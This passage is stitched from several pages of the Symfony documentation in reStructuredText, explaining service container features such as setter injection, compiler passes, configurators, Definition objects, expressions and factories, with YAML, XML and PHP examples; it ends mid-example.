        class Rot13Transformer
        {
            #[Required]
            public LoggerInterface $logger;

            public function transform($value): void
            {
                $this->logger->info('Transforming '.$value);
                // ...
            }
        }

Autowiring Controller Action Methods
------------------------------------

If you're using the Symfony Framework, you can also autowire arguments to your controller
action methods. This is a special case for autowiring, which exists for convenience.
See :ref:`controller-accessing-services` for more details.

Performance Consequences
------------------------

Thanks to Symfony's compiled container, there is *no* performance penalty for using
autowiring. However, there is a small performance penalty in the ``dev`` environment,
as the container may be rebuilt more often as you modify classes. If rebuilding
your container is slow (possible on very large projects), you may not be able to
use autowiring.

Public and Reusable Bundles
---------------------------

Public bundles should explicitly configure their services and not rely on autowiring.
Autowiring depends on the services that are available in the container and bundles have
no control over the service container of applications they are included in. You can use
autowiring when building reusable bundles within your company, as you have full control
over all code.

.. _ROT13: https://en.wikipedia.org/wiki/ROT13
.. _service definition prototype: https://symfony.com/blog/new-in-symfony-3-3-psr-4-based-service-discovery
.. _`PHP constructor promotion`: https://www.php.net/manual/en/language.oop5.decon.php#language.oop5.decon.constructor.promotion
Service Method Calls and Setter Injection
=========================================

.. tip::

    If you're using autowiring, you can use ``#[Required]`` to
    :ref:`automatically configure method calls <autowiring-calls>`.

Usually, you'll want to inject your dependencies via the constructor. But sometimes,
especially if a dependency is optional, you may want to use "setter injection". For
example::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;

    class MessageGenerator
    {
        private LoggerInterface $logger;

        public function setLogger(LoggerInterface $logger): void
        {
            $this->logger = $logger;
        }

        // ...
    }

To configure the container to call the ``setLogger`` method, use the ``calls`` key:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Service\MessageGenerator:
                # ...
                calls:
                    - setLogger: ['@logger']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Service\MessageGenerator">
                    <!-- ... -->
                    <call method="setLogger">
                        <argument type="service" id="logger"/>
                    </call>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MessageGenerator;

        return function(ContainerConfigurator $container): void {
            // ...

            $services->set(MessageGenerator::class)
                ->call('setLogger', [service('logger')]);
        };

To provide immutable services, some classes implement immutable setters.
Such setters return a new instance of the configured class
instead of mutating the object they were called on::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;

    class MessageGenerator
    {
        private LoggerInterface $logger;

        public function withLogger(LoggerInterface $logger): self
        {
            $new = clone $this;
            $new->logger = $logger;

            return $new;
        }

        // ...
    }

Because the method returns a separate cloned instance, configuring such a service means using
the return value of the wither method (``$service = $service->withLogger($logger);``).
The configuration to tell the container it should do so would be like:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Service\MessageGenerator:
                # ...
                calls:
                    - withLogger: !returns_clone ['@logger']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="https://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Service\MessageGenerator">
                    <!-- ... -->
                    <call method="withLogger" returns-clone="true">
                        <argument type="service" id="logger"/>
                    </call>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use App\Service\MessageGenerator;
        use Symfony\Component\DependencyInjection\Reference;

        $container->register(MessageGenerator::class)
            ->addMethodCall('withLogger', [new Reference('logger')], true);

.. tip::

    If autowire is enabled, you can also use attributes; with the previous
    example it would be::

        #[Required]
        public function withLogger(LoggerInterface $logger): static
        {
            $new = clone $this;
            $new->logger = $logger;

            return $new;
        }

    If you don't want a method with a ``static`` return type and
    a ``#[Required]`` attribute to behave as a wither, you can
    add a ``@return $this`` annotation to disable the *returns clone*
    feature.
How to Work with Compiler Passes
================================

Compiler passes give you an opportunity to manipulate other
:doc:`service definitions </service_container/definitions>` that have been
registered with the service container. You can read about how to create them in
the components section ":ref:`components-di-separate-compiler-passes`".

Compiler passes are registered in the ``build()`` method of the application kernel::

    // src/Kernel.php
    namespace App;

    use App\DependencyInjection\Compiler\CustomPass;
    use Symfony\Bundle\FrameworkBundle\Kernel\MicroKernelTrait;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\HttpKernel\Kernel as BaseKernel;

    class Kernel extends BaseKernel
    {
        use MicroKernelTrait;

        // ...

        protected function build(ContainerBuilder $container): void
        {
            $container->addCompilerPass(new CustomPass());
        }
    }

.. _kernel-as-compiler-pass:

One of the most common use-cases of compiler passes is to work with :doc:`tagged
services </service_container/tags>`. In those cases, instead of creating a
compiler pass, you can make the kernel implement
:class:`Symfony\\Component\\DependencyInjection\\Compiler\\CompilerPassInterface`
and process the services inside the ``process()`` method::

    // src/Kernel.php
    namespace App;

    use Symfony\Bundle\FrameworkBundle\Kernel\MicroKernelTrait;
    use Symfony\Component\DependencyInjection\Compiler\CompilerPassInterface;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\HttpKernel\Kernel as BaseKernel;

    class Kernel extends BaseKernel implements CompilerPassInterface
    {
        use MicroKernelTrait;

        // ...

        public function process(ContainerBuilder $container): void
        {
            // in this method you can manipulate the service container:
            // for example, changing some container service:
            $container->getDefinition('app.some_private_service')->setPublic(true);

            // or processing tagged services:
            foreach ($container->findTaggedServiceIds('some_tag') as $id => $tags) {
                // ...
            }
        }
    }

Working with Compiler Passes in Bundles
---------------------------------------

:doc:`Bundles </bundles>` can define compiler passes in the ``build()`` method of
the main bundle class (this is not needed when implementing the ``process()``
method in the extension)::

    // src/MyBundle/MyBundle.php
    namespace App\MyBundle;

    use App\DependencyInjection\Compiler\CustomPass;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\HttpKernel\Bundle\Bundle;

    class MyBundle extends Bundle
    {
        public function build(ContainerBuilder $container): void
        {
            parent::build($container);

            $container->addCompilerPass(new CustomPass());
        }
    }

If you are using custom :doc:`service tags </service_container/tags>` in a
bundle then by convention, tag names consist of the name of the bundle
(lowercase, underscores as separators), followed by a dot, and finally the
"real" name. For example, if you want to introduce some sort of "transport" tag
in your AcmeMailerBundle, you should call it ``acme_mailer.transport``.
How to Configure a Service with a Configurator
==============================================

The *service configurator* is a feature of the service container that allows
you to use a callable to configure a service after its instantiation.

A service configurator can be used, for example, when you have a service
that requires complex setup based on configuration settings coming from
different sources/services. Using an external configurator, you can maintain
the service implementation cleanly and keep it decoupled from the other
objects that provide the configuration needed.

Another use case is when you have multiple objects that share a common
configuration or that should be configured in a similar way at runtime.

For example, suppose you have an application where you send different types
of emails to users. Emails are passed through different formatters that
could be enabled or not depending on some dynamic application settings.
You start defining a ``NewsletterManager`` class like this::

    // src/Mail/NewsletterManager.php
    namespace App\Mail;

    class NewsletterManager implements EmailFormatterAwareInterface
    {
        private array $enabledFormatters;

        public function setEnabledFormatters(array $enabledFormatters): void
        {
            $this->enabledFormatters = $enabledFormatters;
        }

        // ...
    }

and also a ``GreetingCardManager`` class::

    // src/Mail/GreetingCardManager.php
    namespace App\Mail;

    class GreetingCardManager implements EmailFormatterAwareInterface
    {
        private array $enabledFormatters;

        public function setEnabledFormatters(array $enabledFormatters): void
        {
            $this->enabledFormatters = $enabledFormatters;
        }

        // ...
    }

As mentioned before, the goal is to set the formatters at runtime depending
on application settings. To do this, you also have an ``EmailFormatterManager``
class which is responsible for loading and validating formatters enabled
in the application::

    // src/Mail/EmailFormatterManager.php
    namespace App\Mail;

    class EmailFormatterManager
    {
        // ...

        public function getEnabledFormatters(): array
        {
            // code to configure which formatters to use
            $enabledFormatters = [...];

            // ...

            return $enabledFormatters;
        }
    }

If your goal is to avoid having to couple ``NewsletterManager`` and
``GreetingCardManager`` with ``EmailFormatterManager``, then you might want
to create a configurator class to configure these instances::

    // src/Mail/EmailConfigurator.php
    namespace App\Mail;

    class EmailConfigurator
    {
        public function __construct(
            private EmailFormatterManager $formatterManager,
        ) {
        }

        public function configure(EmailFormatterAwareInterface $emailManager): void
        {
            $emailManager->setEnabledFormatters(
                $this->formatterManager->getEnabledFormatters()
            );
        }

        // ...
    }

The ``EmailConfigurator``'s job is to inject the enabled formatters into
``NewsletterManager`` and ``GreetingCardManager`` because they are not aware of
where the enabled formatters come from. On the other hand, the
``EmailFormatterManager`` holds the knowledge about the enabled formatters and
how to load them, keeping the single responsibility principle.

.. tip::

    While this example uses a PHP class method, configurators can be any valid
    PHP callable, including functions, static methods and methods of services.

Using the Configurator
----------------------

You can configure the service configurator using the ``configurator`` option. If
you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
all the classes are already loaded as services. All you need to do is specify the
``configurator``:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            # Registers all 4 classes as services, including App\Mail\EmailConfigurator
            App\:
                resource: '../src/*'
                # ...

            # override the services to set the configurator
            App\Mail\NewsletterManager:
                configurator: ['@App\Mail\EmailConfigurator', 'configure']

            App\Mail\GreetingCardManager:
                configurator: ['@App\Mail\EmailConfigurator', 'configure']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <prototype namespace="App\" resource="../src/*"/>

                <service id="App\Mail\NewsletterManager">
                    <configurator service="App\Mail\EmailConfigurator" method="configure"/>
                </service>

                <service id="App\Mail\GreetingCardManager">
                    <configurator service="App\Mail\EmailConfigurator" method="configure"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mail\EmailConfigurator;
        use App\Mail\GreetingCardManager;
        use App\Mail\NewsletterManager;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            // Registers all 4 classes as services, including App\Mail\EmailConfigurator
            $services->load('App\\', '../src/*');

            // override the services to set the configurator
            $services->set(NewsletterManager::class)
                ->configurator([service(EmailConfigurator::class), 'configure']);

            $services->set(GreetingCardManager::class)
                ->configurator([service(EmailConfigurator::class), 'configure']);
        };

.. _configurators-invokable:

Services can be configured via invokable configurators (replacing the
``configure()`` method with ``__invoke()``) by omitting the method name:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            # registers all classes as services, including App\Mail\EmailConfigurator
            App\:
                resource: '../src/*'
                # ...

            # override the services to set the configurator
            App\Mail\NewsletterManager:
                configurator: '@App\Mail\EmailConfigurator'

            App\Mail\GreetingCardManager:
                configurator: '@App\Mail\EmailConfigurator'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <prototype namespace="App\" resource="../src/*"/>

                <service id="App\Mail\NewsletterManager">
                    <configurator service="App\Mail\EmailConfigurator"/>
                </service>

                <service id="App\Mail\GreetingCardManager">
                    <configurator service="App\Mail\EmailConfigurator"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mail\GreetingCardManager;
        use App\Mail\NewsletterManager;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            // Registers all 4 classes as services, including App\Mail\EmailConfigurator
            $services->load('App\\', '../src/*');

            // override the services to set the configurator
            $services->set(NewsletterManager::class)
                ->configurator(service(EmailConfigurator::class));

            $services->set(GreetingCardManager::class)
                ->configurator(service(EmailConfigurator::class));
        };

That's it! When requesting the ``App\Mail\NewsletterManager`` or
``App\Mail\GreetingCardManager`` service, the created instance will first be
passed to the ``EmailConfigurator::configure()`` method.
How to Debug the Service Container & List Services
==================================================

You can find out what services are registered with the container using the
console. To show all services (public and private) and their PHP classes, run:

.. code-block:: terminal

    $ php bin/console debug:container

    # add this option to display "hidden services" too (those whose ID starts with a dot)
    $ php bin/console debug:container --show-hidden

To see a list of all of the available types that can be used for autowiring, run:

.. code-block:: terminal

    $ php bin/console debug:autowiring

Debugging Service Tags
----------------------

Run the following command to find out what services are :doc:`tagged </service_container/tags>`
with a specific tag:

.. code-block:: terminal

    $ php bin/console debug:container --tag=kernel.event_listener

Partial search is also available:

.. code-block:: terminal

    $ php bin/console debug:container --tag=kernel

    Select one of the following tags to display its information:
     [0] kernel.event_listener
     [1] kernel.event_subscriber
     [2] kernel.reset
     [3] kernel.cache_warmer
     [4] kernel.locale_aware
     [5] kernel.fragment_renderer
     [6] kernel.cache_clearer

Detailed Info about a Single Service
------------------------------------

You can get more detailed information about a particular service by specifying
its id:

.. code-block:: terminal

    $ php bin/console debug:container App\Service\Mailer

    # to show the service arguments:
    $ php bin/console debug:container App\Service\Mailer --show-arguments
How to work with Service Definition Objects
===========================================

Service definitions are the instructions describing how the container should
build a service. They are not the actual services used by your applications.
The container will create the actual class instances based on the configuration
in the definition.

Normally, you would use YAML, XML or PHP to describe the service definitions.
But if you're doing advanced things with the service container, like working
with a :doc:`Compiler Pass </service_container/compiler_passes>` or creating a
:doc:`Dependency Injection Extension </bundles/extension>`, you may need to
work directly with the ``Definition`` objects that define how a service will be
instantiated.

Getting and Setting Service Definitions
---------------------------------------

There are some helpful methods for working with the service definitions::

    use Symfony\Component\DependencyInjection\Definition;

    // finds out if there is an "app.mailer" definition
    $container->hasDefinition('app.mailer');
    // finds out if there is an "app.mailer" definition or alias
    $container->has('app.mailer');

    // gets the "app.user_config_manager" definition
    $definition = $container->getDefinition('app.user_config_manager');
    // gets the definition with the "app.user_config_manager" ID or alias
    $definition = $container->findDefinition('app.user_config_manager');

    // adds a new "app.number_generator" definition
    $definition = new Definition(\App\NumberGenerator::class);
    $container->setDefinition('app.number_generator', $definition);

    // shortcut for the previous method
    $container->register('app.number_generator', \App\NumberGenerator::class);

Working with a Definition
-------------------------

Creating a New Definition
~~~~~~~~~~~~~~~~~~~~~~~~~

In addition to manipulating and retrieving existing definitions, you can also
define new service definitions with the :class:`Symfony\\Component\\DependencyInjection\\Definition`
class.

Class
~~~~~

The first optional argument of the ``Definition`` class is the fully qualified
class name of the object returned when the service is fetched from the container::

    use App\Config\CustomConfigManager;
    use App\Config\UserConfigManager;
    use Symfony\Component\DependencyInjection\Definition;

    $definition = new Definition(UserConfigManager::class);

    // override the class
    $definition->setClass(CustomConfigManager::class);

    // get the class configured for this definition
    $class = $definition->getClass();

Constructor Arguments
~~~~~~~~~~~~~~~~~~~~~

The second optional argument of the ``Definition`` class is an array with the
arguments passed to the constructor of the object returned when the service is
fetched from the container::

    use App\Config\DoctrineConfigManager;
    use Symfony\Component\DependencyInjection\Definition;
    use Symfony\Component\DependencyInjection\Reference;

    $definition = new Definition(DoctrineConfigManager::class, [
        new Reference('doctrine'), // a reference to another service
        '%app.config_table_name%',  // will be resolved to the value of a container parameter
    ]);

    // gets all arguments configured for this definition
    $constructorArguments = $definition->getArguments();

    // gets a specific argument
    $firstArgument = $definition->getArgument(0);
    
    // adds a new named argument
    // '$argumentName' = the name of the argument in the constructor, including the '$' symbol
    $definition = $definition->setArgument('$argumentName', $argumentValue);

    // adds a new argument
    $definition->addArgument($argumentValue);

    // replaces argument on a specific index (0 = first argument)
    $definition->replaceArgument($index, $argument);

    // replaces all previously configured arguments with the passed array
    $definition->setArguments($arguments);

.. caution::

    Don't use ``get()`` to get a service that you want to inject as constructor
    argument, the service is not yet available. Instead, use a
    ``Reference`` instance as shown above.

Method Calls
~~~~~~~~~~~~

If the service you are working with uses setter injection then you can manipulate
any method calls in the definitions as well::

    // gets all configured method calls
    $methodCalls = $definition->getMethodCalls();

    // configures a new method call
    $definition->addMethodCall('setLogger', [new Reference('logger')]);

    // configures an immutable-setter
    $definition->addMethodCall('withLogger', [new Reference('logger')], true);

    // replaces all previously configured method calls with the passed array
    $definition->setMethodCalls($methodCalls);

.. tip::

    There are more examples of specific ways of working with definitions
    in the PHP code blocks of the Service Container articles such as
    :doc:`/service_container/factories` and :doc:`/service_container/parent_services`.

.. note::

    The methods here that change service definitions can only be used before
    the container is compiled. Once the container is compiled you cannot
    manipulate service definitions further. To learn more about compiling
    the container, see :doc:`/components/dependency_injection/compilation`.

Requiring Files
~~~~~~~~~~~~~~~

There might be use cases when you need to include another file just before
the service itself gets loaded. To do so, you can use the
:method:`Symfony\\Component\\DependencyInjection\\Definition::setFile` method::

    $definition->setFile('/src/path/to/file/foo.php');

Notice that Symfony will internally call the PHP statement ``require_once``,
which means that your file will be included only once per request.
How to Inject Values Based on Complex Expressions
=================================================

The service container also supports an "expression" that allows you to inject
very specific values into a service.

For example, suppose you have a service (not shown here), called ``App\Mail\MailerConfiguration``,
which has a ``getMailerMethod()`` method on it. This returns a string - like ``sendmail``
based on some configuration.

Suppose that you want to pass the result of this method as a constructor argument
to another service: ``App\Mailer``. One way to do this is with an expression:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Mail\MailerConfiguration: ~

            App\Mailer:
                # the '@=' prefix is required when using expressions for arguments in YAML files
                arguments: ['@=service("App\\Mail\\MailerConfiguration").getMailerMethod()']
                # when using double-quoted strings, the backslash needs to be escaped twice (see https://yaml.org/spec/1.2/spec.html#id2787109)
                # arguments: ["@=service('App\\\\Mail\\\\MailerConfiguration').getMailerMethod()"]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\Mail\MailerConfiguration"></service>

                <service id="App\Mailer">
                    <argument type="expression">service('App\\Mail\\MailerConfiguration').getMailerMethod()</argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mail\MailerConfiguration;
        use App\Mailer;

        return function(ContainerConfigurator $container): void {
            // ...

            $services->set(MailerConfiguration::class);

            $services->set(Mailer::class)
                // because of the escaping applied by PHP, you must add 4 backslashes for each original backslash
                ->args([expr("service('App\\\\Mail\\\\MailerConfiguration').getMailerMethod()")]);
        };

Learn more about the :doc:`expression language syntax </reference/formats/expression_language>`.

In this context, you have access to 3 functions:

``service``
    Returns a given service (see the example above).
``parameter``
    Returns a specific parameter value (syntax is like ``service``).
``env``
    Returns the value of an env variable.

You also have access to the :class:`Symfony\\Component\\DependencyInjection\\Container`
via a ``container`` variable. Here's another example:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Mailer:
                # the '@=' prefix is required when using expressions for arguments in YAML files
                arguments: ["@=container.hasParameter('some_param') ? parameter('some_param') : 'default_value'"]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Mailer">
                    <argument type="expression">container.hasParameter('some_param') ? parameter('some_param') : 'default_value'</argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mailer;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(Mailer::class)
                ->args([expr("container.hasParameter('some_param') ? parameter('some_param') : 'default_value'")]);
        };

Expressions can be used in ``arguments``, ``properties``, as arguments with
``configurator``, as arguments to ``calls`` (method calls) and in
``factories`` (:doc:`service factories </service_container/factories>`).
Using a Factory to Create Services
==================================

Symfony's Service Container provides multiple features to control the creation
of objects, allowing you to specify arguments passed to the constructor as well
as calling methods and setting parameters.

However, sometimes you need to apply the `factory design pattern`_ to delegate
the object creation to some special object called "the factory". In those cases,
the service container can call a method on your factory to create the object
rather than directly instantiating the class.

Static Factories
----------------

Suppose you have a factory that configures and returns a new ``NewsletterManager``
object by calling the static ``createNewsletterManager()`` method::

    // src/Email/NewsletterManagerStaticFactory.php
    namespace App\Email;

    // ...

    class NewsletterManagerStaticFactory
    {
        public static function createNewsletterManager(): NewsletterManager
        {
            $newsletterManager = new NewsletterManager();

            // ...

            return $newsletterManager;
        }
    }

To make the ``NewsletterManager`` object available as a service, use the
``factory`` option to define which method of which class must be called to
create its object:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Email\NewsletterManager:
                # the first argument is the class and the second argument is the static method
                factory: ['App\Email\NewsletterManagerStaticFactory', 'createNewsletterManager']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Email\NewsletterManager">
                    <!-- the first argument is the class and the second argument is the static method -->
                    <factory class="App\Email\NewsletterManagerStaticFactory" method="createNewsletterManager"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Email\NewsletterManager;
        use App\Email\NewsletterManagerStaticFactory;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(NewsletterManager::class)
                // the first argument is the class and the second argument is the static method
                ->factory([NewsletterManagerStaticFactory::class, 'createNewsletterManager']);
        };

.. note::

    When using a factory to create services, the value chosen for class
    has no effect on the resulting service. The actual class name
    only depends on the object that is returned by the factory. However,
    the configured class name may be used by compiler passes and therefore
    should be set to a sensible value.

Using the Class as Factory Itself
---------------------------------

When the static factory method is on the same class as the created instance,
the class name can be omitted from the factory declaration.
Let's suppose the ``NewsletterManager`` class has a ``create()`` method that needs
to be called to create the object and needs a sender::

    // src/Email/NewsletterManager.php
    namespace App\Email;

    // ...

    class NewsletterManager
    {
        private string $sender;

        public static function create(string $sender): self
        {
            $newsletterManager = new self();
            $newsletterManager->sender = $sender;
            // ...

            return $newsletterManager;
        }
    }

You can omit the class on the factory declaration:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Email\NewsletterManager:
                factory: [null, 'create']
                arguments:
                    $sender: 'fabien@symfony.com'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Email\NewsletterManager">
                    <factory method="create"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Email\NewsletterManager;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            // Note that we are not using service()
            $services->set(NewsletterManager::class)
                ->factory([null, 'create']);
        };

It is also possible to use the ``constructor`` option, instead of passing ``null``
as the factory class:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Email/NewsletterManager.php
        namespace App\Email;

        use Symfony\Component\DependencyInjection\Attribute\Autoconfigure;

        #[Autoconfigure(bind: ['$sender' => 'fabien@symfony.com'], constructor: 'create')]
        class NewsletterManager
        {
            private string $sender;

            public static function create(string $sender): self
            {
                $newsletterManager = new self();
                $newsletterManager->sender = $sender;
                // ...

                return $newsletterManager;
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Email\NewsletterManager:
                constructor: 'create'
                arguments:
                    $sender: 'fabien@symfony.com'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Email\NewsletterManager" constructor="create">
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Email\NewsletterManager;

        return function(ContainerConfigurator $containerConfigurator) {
            $services = $containerConfigurator->services();

            $services->set(NewsletterManager::class)
                ->constructor('create');
        };

Non-Static Factories
--------------------

If your factory is using a regular method instead of a static one to configure
and create the service, instantiate the factory itself as a service too.
Configuration of the service container then looks like this:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            # first, create a service for the factory
            App\Email\NewsletterManagerFactory: ~

            # second, use the factory service as the first argument of the 'factory'
            # option and the factory method as the second argument
            App\Email\NewsletterManager:
                factory: ['@App\Email\NewsletterManagerFactory', 'createNewsletterManager']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- first, create a service for the factory -->
                <service id="App\Email\NewsletterManagerFactory"/>

                <!-- second, use the factory service as the first argument of the 'factory'
                     option and the factory method as the second argument -->
                <service id="App\Email\NewsletterManager">
                    <factory service="App\Email\NewsletterManagerFactory"
                        method="createNewsletterManager"
                    />
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Email\NewsletterManager;
        use App\Email\NewsletterManagerFactory;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            // first, create a service for the factory
            $services->set(NewsletterManagerFactory::class);

            // second, use the factory service as the first argument of the 'factory'
            // method and the factory method as the second argument
            $services->set(NewsletterManager::class)
                ->factory([service(NewsletterManagerFactory::class), 'createNewsletterManager']);
        };

.. _factories-invokable:

Invokable Factories
-------------------

Suppose you now change your factory method to ``__invoke()`` so that your
factory service can be used as a callback::

    // src/Email/InvokableNewsletterManagerFactory.php
    namespace App\Email;

    // ...
    class InvokableNewsletterManagerFactory
    {
        public function __invoke(): NewsletterManager
        {
            $newsletterManager = new NewsletterManager();

            // ...

            return $newsletterManager;
        }
    }

Services can be created and configured via invokable factories by omitting the
method name:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Email\NewsletterManager:
                class:   App\Email\NewsletterManager
                factory: '@App\Email\InvokableNewsletterManagerFactory'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\Email\NewsletterManager"
                         class="App\Email\NewsletterManager">
                    <factory service="App\Email\InvokableNewsletterManagerFactory"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Email\NewsletterManager;
        use App\Email\NewsletterManagerFactory;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(NewsletterManager::class)
                ->factory(service(InvokableNewsletterManagerFactory::class));
        };

Using Expressions in Service Factories
--------------------------------------

Instead of using PHP classes as a factory, you can also use
:doc:`expressions </service_container/expression_language>`. This allows you to
e.g. change the service based on a parameter:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Email\NewsletterManagerInterface:
                # use the "tracable_newsletter" service when debug is enabled, "newsletter" otherwise.
                # "@=" indicates that this is an expression
                factory: '@=parameter("kernel.debug") ? service("tracable_newsletter") : service("newsletter")'

            # you can use the arg() function to retrieve an argument from the definition
            App\Email\NewsletterManagerInterface:
                factory: "@=arg(0).createNewsletterManager() ?: service("default_newsletter_manager")"
                arguments:
                    - '@App\Email\NewsletterManagerFactory'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Email\NewsletterManagerInterface">
                    <!-- use the "tracable_newsletter" service when debug is enabled, "newsletter" otherwise -->
                    <factory expression="parameter('kernel.debug') ? service('tracable_newsletter') : service('newsletter')"/>
                </service>

                <!-- you can use the arg() function to retrieve an argument from the definition -->
                <service id="App\Email\NewsletterManagerInterface">
                    <factory expression="arg(0).createNewsletterManager() ?: service("default_newsletter_manager")"/>
                    <argument type="service" id="App\Email\NewsletterManagerFactory"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
